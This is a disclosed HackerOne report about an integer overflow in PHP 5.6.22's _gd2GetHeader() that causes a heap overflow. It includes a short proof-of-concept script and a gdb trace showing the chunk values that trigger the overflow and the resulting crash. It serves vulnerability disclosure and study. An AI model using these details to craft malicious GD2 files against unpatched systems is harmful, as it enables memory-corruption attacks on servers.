---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '143234'
original_report_id: '143234'
title: Integer Overflow in _gd2GetHeader() resulting in heap overflow
weakness: Memory Corruption - Generic
team_handle: ibb
created_at: '2016-06-05T19:55:10.069Z'
disclosed_at: '2019-11-12T09:34:58.187Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
asset_identifier: PHP
asset_type: OTHER
max_severity: none
tags:
- hackerone
- memory-corruption-generic
---

# Integer Overflow in _gd2GetHeader() resulting in heap overflow

## Metadata

- HackerOne Report ID: 143234
- Weakness: Memory Corruption - Generic
- Program: ibb
- Disclosed At: 2019-11-12T09:34:58.187Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The _gd2GetHeader() is prone to an integer overflow, which result in heap based overflow.

Tested on PHP 5.6.22

--------------- PoC ---------------
$ ls
poc.gd   poc.php
$ cat poc.php
<?php imagecreatefromgd2("poc.gd"); ?>


--------------- Result ---------------
/php$ gdb -q --args ./php-5.6.22/sapi/cli/php poc.php
Reading symbols from /php/php-5.6.22/sapi/cli/php...done.
(gdb) b gd_gd2.c:139
Breakpoint 1 at 0x570869: file /php/php-5.6.22/ext/gd/libgd/gd_gd2.c, line 139.
(gdb) r
Starting program: /php/./php-5.6.22/sapi/cli/php poc.php

Breakpoint 1, _gd2GetHeader (in=0x7ffff7fd0ac0, sx=0x7fffffffa520, 
    sy=0x7fffffffa524, cs=0x7fffffffa530, vers=0x7fffffffa534, 
    fmt=0x7fffffffa538, ncx=0x7fffffffa528, ncy=0x7fffffffa52c, 
    chunkIdx=0x7fffffffa540) at /php/php-5.6.22/ext/gd/libgd/gd_gd2.c:139
139			nc = (*ncx) * (*ncy);      <---------- ncx(Chunks wide) is 0x5b00, ncy(Chunks high) is 0x5b00
<---------- As a result, 'nc' is 0x20590000.

(gdb) x/xw ncx
0x7fffffffa528:	0x00005b00
(gdb) x/xw ncy
0x7fffffffa52c:	0x00005b00
(gdb) n
141			sidx = sizeof(t_chunk_info) * nc;      <---------- sizeof(t_chunk_info) is 0x8.
<---------- The result of the multiplication can overflow.

(gdb) n
142			if (sidx <= 0) {
(gdb) n
145			cidx = gdCalloc(sidx, 1);     <---------- gdCalloc() call will allocate a buffer too small to contain the chunk entries.
(gdb) info locals
sidx = 46661632 (0x2C80000)
nc = 542703616 (0x20590000)
...
(gdb) n
146			for (i = 0; i < nc; i++) {
(gdb) n
145			cidx = gdCalloc(sidx, 1);
(gdb) n
146			for (i = 0; i < nc; i++) {
(gdb) n
147				if (gdGetInt(&cidx[i].offset, in) != 1) {    <---------- It cause heap overflow
(gdb) n
151				if (gdGetInt(&cidx[i].size, in) != 1) {
(gdb) n
155				if (cidx[i].offset < 0 || cidx[i].size < 0) {
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
php_gd_gdGetInt (result=result@entry=0x7ffff6116000, 
    ctx=ctx@entry=0x7ffff7fd0ac0) at /php/php-5.6.22/ext/gd/libgd/gd_io.c:103
103		*result = r << 24;
(gdb)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
